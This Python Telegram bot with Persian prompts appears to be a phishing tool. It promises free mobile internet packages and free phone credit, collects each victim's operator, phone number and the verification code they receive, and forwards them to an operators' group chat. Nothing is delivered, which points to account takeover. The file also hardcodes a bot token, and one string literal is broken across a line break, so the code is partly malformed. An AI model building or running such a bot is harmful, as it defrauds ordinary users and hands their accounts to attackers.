from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters, ConversationHandler
)

(
    INTERNET_AMOUNT, INTERNET_OPERATOR, INTERNET_PHONE, INTERNET_CODE,
    CHARGE_AMOUNT, CHARGE_OPERATOR, CHARGE_PHONE, CHARGE_CODE
) = range(8)

GROUP_CHAT_ID = -1002876958936

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat.type == "private":
        keyboard = [
            [InlineKeyboardButton("📶 درخواست بسته اینترنت", callback_data="internet")],
            [InlineKeyboardButton("💳 درخواست شارژ رایگان", callback_data="charge")]
        ]
        await update.message.reply_text(
            "🎉 <b>به ربات خدمات رایگان خوش آمدید!</b>

"
            "👇 یکی از گزینه‌های زیر را انتخاب کنید:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text("🔗 @NEXO_999\n🔗 @IM_NEXO")

async def menu_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "internet":
        await query.message.reply_text("✍️ لطفاً مقدار بسته اینترنت را وارد کنید (مثال: 2 گیگ):")
        return INTERNET_AMOUNT
    elif query.data == "charge":
        await query.message.reply_text("💰 لطفاً مقدار شارژ را وارد کنید (مثال: 10000):")
        return CHARGE_AMOUNT

# اینترنت
async def get_internet_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['internet_amount'] = update.message.text
    keyboard = [[
        InlineKeyboardButton("📱 همراه اول", callback_data="mci"),
        InlineKeyboardButton("📡 ایرانسل", callback_data="irancell"),
        InlineKeyboardButton("📶 رایتل", callback_data="rightel")
    ]]
    await update.message.reply_text("🔍 لطفاً اپراتور خود را انتخاب کنید:", reply_markup=InlineKeyboardMarkup(keyboard))
    return INTERNET_OPERATOR

async def internet_operator_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data['internet_operator'] = query.data
    await query.message.reply_text("📞 لطفاً شماره تلفن خود را وارد کنید:")
    return INTERNET_PHONE

async def get_internet_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text
    context.user_data['internet_phone'] = phone
    await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=f"📞 شماره اینترنت ثبت شد: <code>{phone}</code>", parse_mode="HTML")
    await update.message.reply_text("🔐 لطفاً کد دریافتی را وارد کنید:")
    return INTERNET_CODE

async def get_internet_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text
    msg = (
        "📶 <b>درخواست بسته اینترنت</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"💾 مقدار: <code>{context.user_data['internet_amount']}</code>\n"
        f"📡 اپراتور: <code>{context.user_data['internet_operator']}</code>\n"
        f"📞 شماره: <code>{context.user_data['internet_phone']}</code>\n"
        f"🔑 کد: <code>{code}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=msg, parse_mode="HTML")
    await context.bot.send_message(chat_id=GROUP_CHAT_ID, text="🔗 @NEXO_999\n🔗 @IM_NEXO")
    await update.message.reply_text("✅ درخواست شما با موفقیت ثبت شد. منتظر دریافت باشید ✨")
    return ConversationHandler.END

# شارژ
async def get_charge_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['charge_amount'] = update.message.text
    keyboard = [[
        InlineKeyboardButton("📱 همراه اول", callback_data="mci"),
        InlineKeyboardButton("📡 ایرانسل", callback_data="irancell"),
        InlineKeyboardButton("📶 رایتل", callback_data="rightel")
    ]]
    await update.message.reply_text("🔍 لطفاً اپراتور خود را انتخاب کنید:", reply_markup=InlineKeyboardMarkup(keyboard))
    return CHARGE_OPERATOR

async def charge_operator_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data['charge_operator'] = query.data
    await query.message.reply_text("📞 لطفاً شماره تلفن خود را وارد کنید:")
    return CHARGE_PHONE

async def get_charge_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text
    context.user_data['charge_phone'] = phone
    await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=f"📞 شماره شارژ ثبت شد: <code>{phone}</code>", parse_mode="HTML")
    await update.message.reply_text("🔐 لطفاً کد دریافتی را وارد کنید:")
    return CHARGE_CODE

async def get_charge_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text
    msg = (
        "💳 <b>درخواست شارژ رایگان</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"💰 مقدار: <code>{context.user_data['charge_amount']}</code>\n"
        f"📡 اپراتور: <code>{context.user_data['charge_operator']}</code>\n"
        f"📞 شماره: <code>{context.user_data['charge_phone']}</code>\n"
        f"🔑 کد: <code>{code}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=msg, parse_mode="HTML")
    await context.bot.send_message(chat_id=GROUP_CHAT_ID, text="🔗 @NEXO_999\n🔗 @IM_NEXO")
    await update.message.reply_text("✅ درخواست شما ثبت شد. منتظر دریافت باشید 📲")
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ عملیات لغو شد.")
    return ConversationHandler.END

def main():
    TOKEN = "7663092236:AAESrnB0TvQipvMYaGsH2yW6gUA3CnOLQB0"
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(menu_selection)],
        states={
            INTERNET_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_internet_amount)],
            INTERNET_OPERATOR: [CallbackQueryHandler(internet_operator_selection)],
            INTERNET_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_internet_phone)],
            INTERNET_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_internet_code)],
            CHARGE_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_charge_amount)],
            CHARGE_OPERATOR: [CallbackQueryHandler(charge_operator_selection)],
            CHARGE_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_charge_phone)],
            CHARGE_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_charge_code)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    app.run_polling()

if __name__ == "__main__":
    main()